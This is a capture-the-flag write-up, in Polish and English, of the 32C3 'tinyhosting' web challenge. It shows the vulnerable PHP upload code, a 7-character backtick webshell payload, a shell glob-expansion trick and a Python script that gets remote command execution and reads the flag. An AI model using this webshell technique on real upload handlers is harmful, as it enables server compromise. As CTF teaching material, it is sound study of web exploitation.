## tinyhosting (web, 250p, 71 solves)

> a new file hosting service for very small files. could you pwn it?
> 
> http://136.243.194.53/

### pl
[eng](#eng-version)

pod http://136.243.194.53/ znajduje się formularz umożliwiający wysyłanie plików na serwer.

w kodzie html znajduje się komentarz:

    <!-- <a href="./?src=">src</a>-->

po dodaniu do url `?src=1` możemy zobaczyć kod strony:

	<?php
		$savepath="files/".sha1($_server['remote_addr'].$_server['http_user_agent'])."/";
		if(!is_dir($savepath)){
		    $oldmask = umask(0);
		    mkdir($savepath, 0777);
		    umask($oldmask);
		    touch($savepath."/index.html");
		}
		if((@$_post['filename']) && (@$_post['content']) ){
		    $fp = fopen("$savepath".$_post['filename'], 'w');
		    fwrite($fp, substr($_post['content'],0,7) );
		    fclose($fp);
		    $msg = 'file saved to <a>'.$savepath.htmlspecialchars($_post['filename'])."</a>";
		}
	?>

skrypt pozwala na tworzenie plików z rozszerzeniem .php. treść jest jednak ucinana do 7 znaków. `<?php ?` generuje `internal server error`.

używająć krótkiego tagu startowego i pomijająć końcowy możemy wykonać jednoliterowe polecenie: ``<?=`*`;``

jeżeli stworzymy pliki o nazwach `bash` i `bash2`, `*` rozwinie się do `bash bash2 index.html`. możemy w ten sposób wykonywać 7 znakowe skrypty shellowe:

	import requests
	import re

	url = "http://136.243.194.53/"
	user_agent = "xxx"

	t = requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"zzz.php", "content":"<?=`*`;"}).text
	[path] = re.findall('files.*/zzz.php', t)

	requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"bash", "content":'xxx'})
	requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"bash2", "content":'ls /'})
	r = requests.get(url+path)

	print r.text

w głównym katalogu znajduje się plik `file_you_want`. możemy go pobrać poleceniem `cat /f*`. w pliku znajduje się flaga:

    32c3_gr34t_th1ng5_are_d0ne_by_a_ser13s_0f_5ma11_th1ngs_br0ught_t0ge7h3r

### eng version

under http://136.243.194.53/ there is a form which allows uploading files.

in page source there is a comment:

    <!-- <a href="./?src=">src</a>-->

after adding `?src=1` to the url php source is printed:

	<?php
		$savepath="files/".sha1($_server['remote_addr'].$_server['http_user_agent'])."/";
		if(!is_dir($savepath)){
		    $oldmask = umask(0);
		    mkdir($savepath, 0777);
		    umask($oldmask);
		    touch($savepath."/index.html");
		}
		if((@$_post['filename']) && (@$_post['content']) ){
		    $fp = fopen("$savepath".$_post['filename'], 'w');
		    fwrite($fp, substr($_post['content'],0,7) );
		    fclose($fp);
		    $msg = 'file saved to <a>'.$savepath.htmlspecialchars($_post['filename'])."</a>";
		}
	?>

page doesn't block creating files with .php extension. the content is limited to 7 chars though. `<?php ?` generates `internal server error`. 

by using short start tags and ommiting end tag it's possible to execute single char shell command:  ``<?=`*`;``

if we create two files: `bash` and `bash2`, `*` will expand to: `bash bash2 index.html`. this way we can execute 7 char shell scripts:

	import requests
	import re

	url = "http://136.243.194.53/"
	user_agent = "xxx"

	t = requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"zzz.php", "content":"<?=`*`;"}).text
	[path] = re.findall('files.*/zzz.php', t)

	requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"bash", "content":'xxx'})
	requests.post(url, headers = {'user-agent': user_agent }, data = {"filename":"bash2", "content":'ls /'})
	r = requests.get(url+path)

	print r.text

in root directory there is a file named `file_you_want`. we can get its contents with `cat /f*`. this file contains the flag:

    32c3_gr34t_th1ng5_are_d0ne_by_a_ser13s_0f_5ma11_th1ngs_br0ught_t0ge7h3r

